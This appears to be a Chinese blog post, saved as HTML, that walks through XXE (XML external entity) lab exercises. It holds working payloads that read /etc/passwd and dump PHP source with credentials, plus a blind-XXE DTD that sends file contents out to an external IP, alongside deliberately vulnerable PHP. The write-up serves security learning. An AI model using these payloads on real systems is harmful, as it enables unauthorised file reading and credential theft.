@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="FJtFPhqPz0">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.ydq6.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="XXE漏洞实验  本文主要为XXE漏洞实战。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE漏洞实验">
+<meta property="og:url" content="http://blog.ydq6.com/web/XXE%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C/index.html">
+<meta property="og:site_name" content="gwolfs的个人博客">
+<meta property="og:description" content="XXE漏洞实验  本文主要为XXE漏洞实战。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200511131239868.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200511134218161.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200512173031186.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200512173328274.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200512174400262.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200512175248013.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200512175419134.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200512181711946.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200512181804569.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200512183847087.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200512185519178.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200512191755026.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200512191821789.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200513095511671.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200513095810003.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200513101256793.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200513101344183.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200513101431798.png">
+<meta property="article:published_time" content="2020-05-13T02:18:17.000Z">
+<meta property="article:modified_time" content="2020-05-13T02:28:55.290Z">
+<meta property="article:author" content="gwolfs">
+<meta property="article:tag" content="xxe">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.ydq6.com/assets/image-20200511131239868.png">
+
+<link rel="canonical" href="http://blog.ydq6.com/web/XXE%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>XXE漏洞实验 | gwolfs的个人博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="gwolfs的个人博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">gwolfs的个人博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://blog.ydq6.com/web/XXE%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head1.png">
+      <meta itemprop="name" content="gwolfs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gwolfs的个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XXE漏洞实验
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-05-13 10:18:17 / 修改时间：10:28:55" itemprop="dateCreated datePublished" datetime="2020-05-13T10:18:17+08:00">2020-05-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <center><font size="7">XXE漏洞实验</font></center>
+
+<p>本文主要为XXE漏洞实战。</p>
+<a id="more"></a>
+
+<h1><span id="靶场实验">靶场实验</span></h1><h2><span id="有回显xxe">有回显XXE</span></h2><p>代码审计看一下js代码（test1.js）。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> username = $(<span class="string">"#username"</span>).val();</span><br><span class="line">	<span class="keyword">var</span> password = $(<span class="string">"#password"</span>).val();</span><br><span class="line">	<span class="keyword">if</span>(username == <span class="string">""</span> || password == <span class="string">""</span>)&#123;</span><br><span class="line">		alert(<span class="string">"Please enter the username and password!"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">var</span> data = <span class="string">"&lt;user&gt;&lt;username&gt;"</span> + username + <span class="string">"&lt;/username&gt;&lt;password&gt;"</span> + password + <span class="string">"&lt;/password&gt;&lt;/user&gt;"</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">"doLogin1.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/xml;charset=utf-8"</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        dataType: <span class="string">"xml"</span>,</span><br><span class="line">        anysc: <span class="literal">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">        	<span class="keyword">var</span> code = result.getElementsByTagName(<span class="string">"code"</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue;</span><br><span class="line">        	<span class="keyword">var</span> msg = username;</span><br><span class="line"></span><br><span class="line">        	<span class="keyword">if</span>(code == <span class="string">"0"</span>)&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(msg + <span class="string">" login fail!"</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">"1"</span>)&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(msg + <span class="string">" login success!"</span>);</span><br><span class="line">        		alert(<span class="string">"login success!"</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(<span class="string">"error:"</span> + msg);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">".msg"</span>).text(errorThrown + <span class="string">':'</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>是一个ajax请求，传入的是xml，所以可以使用xxe。</p>
+<p>而且在源码审计中发现口令在：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/tmp/</span>password.txt</span><br></pre></td></tr></table></figure>
+
+<p>所以XXE读这个文件即可。</p>
+<p>在登录框输入账户名：admin,密码:123.</p>
+<p>抓到包：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/vulnlab/xxe/doLogin1.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 47.105.75.177</span><br><span class="line"><span class="attribute">Content-Length</span>: 63</span><br><span class="line"><span class="attribute">Accept</span>: application/xml, text/xml, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span>: application/xml;charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span>: http://47.105.75.177</span><br><span class="line"><span class="attribute">Referer</span>: http://47.105.75.177/vulnlab/xxe/index1.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: BkGOp9578O_think_template=default; UM_distinctid=171e9e4df09110-01bb29db0210e5-c373667-1fa400-171e9e4df0a352; CNZZDATA1257137=cnzz_eid%3D1631752570-1588767023-http%253A%252F%252F47.105.75.177%252F%26ntime%3D1588864880; CNZZDATA3801251=cnzz_eid%3D1725538590-1588767023-http%253A%252F%252F47.105.75.177%252F%26ntime%3D1589014034; DedeUserID=15; DedeUserID__ckMd5=b150f3b13efab666; DedeLoginTime=1589018256; DedeLoginTime__ckMd5=47d5213a542b9f30</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;admin&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现响应中包含admin，所以是带回显的XXE。把需要显示的值放在username里就可以了。</p>
+<p>(1)读文件</p>
+<p>XXE读文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">gvi</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///tmp/password.txt"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但发现读取不成功。</p>
+<p>再尝试：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///tmp/password.txt"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>也不行。</p>
+<p>尝试其他文件（/etc/passwd）：</p>
+<p><img src="/assets/image-20200511131239868.png" alt="image-20200511131239868"></p>
+<p>读取成功，看来那个文件可能不存在。</p>
+<p>（2）读源码</p>
+<p>使用php伪协议读取源码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">gvi</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=doLogin1.php"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$USERNAME = <span class="string">'heetianlab'</span>; <span class="comment">//è´¦å·</span></span><br><span class="line">$PASSWORD = <span class="string">'test009'</span>; <span class="comment">//å¯ç </span></span><br><span class="line">$result = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">	$username = $creds-&gt;username;</span><br><span class="line">	$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span><br><span class="line">		$result1 = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">1</span>,$username);</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;"</span>,<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$result1 = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">0</span>,$username);</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;"</span>,<span class="number">0</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">	$result1 = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>,<span class="number">3</span>,$e-&gt;getMessage());</span><br><span class="line">	$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;/result&gt;"</span>,<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">echo</span> $result1;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到用户名：heetianlab，密码：test009</p>
+<h2><span id="无回显xxe">无回显XXE</span></h2><p>同样的登录时候抓包，发现没回显了：</p>
+<p><img src="/assets/image-20200511134218161.png" alt="image-20200511134218161"></p>
+<p>这时候就要我们的远程服务器进行攻击了.</p>
+<p>evil2.dtd:</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read-convert.base64-encode/resource=http://47.105.75.177/vulnlab/xxe/doLogin2.php"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY send SYSTEM 'http://104.243.21.153:8998/%file;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%all;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>构造请求包：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://104.243.21.153/xxe/evil2.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;send<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>多次尝试都不能成功，估计禁用了外部实体。</p>
+<p>因为这个实验不会做，所以做了下面个合天的实验。</p>
+<h1><span id="xml外部实体注入漏洞">XML外部实体注入漏洞</span></h1><h2><span id="实验一-dtd学习">实验一 DTD学习</span></h2><p>（1）内部实体声明：</p>
+<p>内部实体声明语法：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-string">"实体的值"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>getxml.php源码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	$xml = simplexml_load_string($_GET[<span class="string">'XML'</span>],<span class="string">'simplexmlElement'</span>,LIBXML_NOENT);</span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span></span><br><span class="line"><span class="php">	print_r($xml);</span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>使用浏览器访问：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/xml/getxml.php?xml=<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">books</span>[<span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-string">"Hello World"</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">books</span>&gt;</span>%26test;<span class="tag">&lt;/<span class="name">books</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意&amp;要url编码为%26不然会被识别为参数分隔符&amp;符号。</p>
+<p><img src="/assets/image-20200512173031186.png" alt="image-20200512173031186"></p>
+<p>（2）外部实体声明语法</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY </span></span><br><span class="line"><span class="meta">实体名称 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"URI/URL"</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>同样使用浏览器访问：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/xml/getxml.php?xml=<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">books</span>[<span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://localhost/xmltest.txt"</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">books</span>&gt;</span>%26test;<span class="tag">&lt;/<span class="name">books</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200512173328274.png" alt="image-20200512173328274"></p>
+<p>注意，从实体的引用分为三类：</p>
+<ul>
+<li>一般实体 直接使用&amp;实体名; 进行引用</li>
+<li>预定义实体 就是有些特殊符号需要实体化。</li>
+<li>参数实体 用 % 实体名称 定义。</li>
+</ul>
+<p>（3）参数实体</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内部：<span class="meta">&lt;!ENTITY % 实体名称 <span class="meta-string">"实体值"</span>&gt;</span></span><br><span class="line">外部：<span class="meta">&lt;!ENTITY % 实体名称 <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">"URI"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用浏览器访问</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/xml/getxml.php?xml=<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">books</span>[<span class="meta">&lt;!ENTITY %25 <span class="meta-keyword">test</span> <span class="meta-string">"&lt;!ENTITY hello ‘hello world’&gt;"</span>&gt;</span>%25test;]&gt;</span><span class="tag">&lt;<span class="name">books</span>&gt;</span>%26hello;<span class="tag">&lt;/<span class="name">books</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200512174400262.png" alt="image-20200512174400262"></p>
+<h2><span id="实验二-有回显的本地文件读取">实验二  有回显的本地文件读取</span></h2><p>漏洞代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	libxml_disable_entity_loader(<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">	$xmlfile = file_get_contents(‘php:<span class="comment">//input’);</span></span></span><br><span class="line"><span class="php">	$dom = <span class="keyword">new</span> DOMDocument();</span></span><br><span class="line"><span class="php">	$dom-&gt;loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);</span></span><br><span class="line"><span class="php">	$creds = simplexml_import_dom($dom); </span></span><br><span class="line"><span class="php">	<span class="keyword">echo</span> $creds;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>正常get请求：</p>
+<p><img src="/assets/image-20200512175248013.png" alt="image-20200512175248013"></p>
+<p>添加body：</p>
+<p><img src="/assets/image-20200512175419134.png" alt="image-20200512175419134"></p>
+<p>读文件：</p>
+<p><img src="/assets/image-20200512181711946.png" alt="image-20200512181711946"></p>
+<p>读带有特殊符号文件：</p>
+<p><img src="/assets/image-20200512181804569.png" alt="image-20200512181804569"></p>
